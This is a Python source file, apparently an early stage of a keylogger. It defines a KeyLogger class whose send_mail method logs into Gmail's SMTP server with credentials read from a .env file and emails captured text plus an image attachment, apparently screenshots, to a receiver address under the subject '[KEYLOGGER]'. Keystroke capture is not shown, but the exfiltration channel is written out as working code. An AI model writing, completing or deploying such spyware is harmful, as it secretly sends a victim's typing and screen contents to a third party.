"""
- Use logging instead of print() so you can turn off all at once
"""
from dotenv import dotenv_values
from datetime import datetime
from email.message import EmailMessage
import imghdr
import smtplib
import ssl
import time

class KeyLogger:
    def __init__(self, sender_email, password, receiver_email):
        self.sender_email = sender_email
        self.password = password
        self.receiver_email = receiver_email
        self.interval = 30 # in seconds

    def send_mail(self, text_data, img_data):
        port = 465  # For SSL
        context = ssl.create_default_context() # Create a secure SSL context

        with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
            now = datetime.now().strftime("%H:%M:%S %d/%m/%Y ")
            
            # configure email headers
            message = EmailMessage()
            message['Subject'] = f"[KEYLOGGER]: {now}"
            message['From'] = self.sender_email
            message['To'] = self.receiver_email

            message.set_content(text_data)
            message.add_attachment(img_data, maintype='image', subtype=imghdr.what(None, img_data))

            print("[*] Logging...")
            server.login(self.sender_email, self.password)
            print("[*] Logged in...")
            server.send_message(message)
            print("[+] Message is sent!")


def main():
    # get environment variables
    config = dotenv_values(".env")
    sender_email = config['MY_EMAIL']
    password = config['APP_PASS']
    receiver_email = config['TARGET_EMAIL']
    
    # initialize keylogger object
    keylogger = KeyLogger(sender_email, password, receiver_email)

    with open('image.jpg', 'rb') as file:
        image_data = file.read()

    keylogger.send_mail("test subject", image_data)
    

if __name__ == "__main__":
    main()